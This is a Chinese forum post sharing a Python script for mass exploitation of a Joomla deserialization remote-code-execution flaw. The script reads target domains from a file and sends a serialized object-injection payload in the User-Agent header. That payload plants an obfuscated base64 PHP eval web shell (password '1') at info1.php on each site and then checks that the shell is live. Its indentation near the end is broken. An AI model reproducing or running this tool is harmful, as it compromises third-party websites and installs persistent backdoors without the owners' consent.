
本帖最后由 宝-宝 于 2015-12-17 13:44 编辑


使用方法：
1、在目录下面新建个w.txt，里面填入你要批量的域名，
2、python 1.py 即可，
3、如果在窗口上看到显示200，即为成功,shell密码为1 shell地址已经打印出来

不知道怎么插入代码就这样粘贴了，，管理帮忙改改。。。。。

import urllib
import re
 
# !/usr/bin/python
# coding=utf-8
import urllib2
import cookielib, sys
fb  = open('w.txt')
domians = []
for i in fb:
        i = i.split()
        site="".join(i)
        print "test "+site
        code = "file_put_contents($_SERVER['DOCUMENT_ROOT'].'/info1.php',base64_decode('PD9waHAgJG1hdWMwPSAidWVydG9fcHMiIDsgJHVpeDM9ICRtYXVjMFs3XS4kbWF1YzBbM10uICRtYXVjMFsyXS4gJG1hdWMwWzNdLiRtYXVjMFs0XS4gJG1hdWMwWzBdLiRtYXVjMFs2XS4kbWF1YzBbNl0uJG1hdWMwWzFdLiRtYXVjMFsyXSA7JG1lbTg3ID0gJHVpeDMoJG1hdWMwWzVdLiAkbWF1YzBbNl0gLiRtYXVjMFs0XS4gJG1hdWMwWzddLiRtYXVjMFszXSk7IGlmKGlzc2V0KCR7JG1lbTg3fSBbJ3E4MjhlMDAnXSApKSB7ZXZhbCAoJHsgJG1lbTg3IH0gWyAncTgyOGUwMCddKTt9Pz4='))"
        url = site + '?1=' + urllib.quote(
                "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo '->|';" + code + ";echo '|<-';")
 
        cj = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
        urllib2.install_opener(opener)
        urllib2.socket.setdefaulttimeout(10)
 
        ua = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:46:"eval($_REQUEST[1]);JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86'
        try:
                req = urllib2.Request(url=url, headers={'User-Agent': ua})
                opener.open(req)
                req = urllib2.Request(url=url)
                res = opener.open(req).read()
        except:
                print "error"
    try:
            if  re.findall(r'\-\>\|(.*?)\|\<\-', res, re.DOTALL):
                 
                        sres = urllib2.urlopen(site+'/info1.php')
                        print site+'/info1.php    '+str(sres.getcode())
                except:
                        print "shell no fonund"
fb.close()
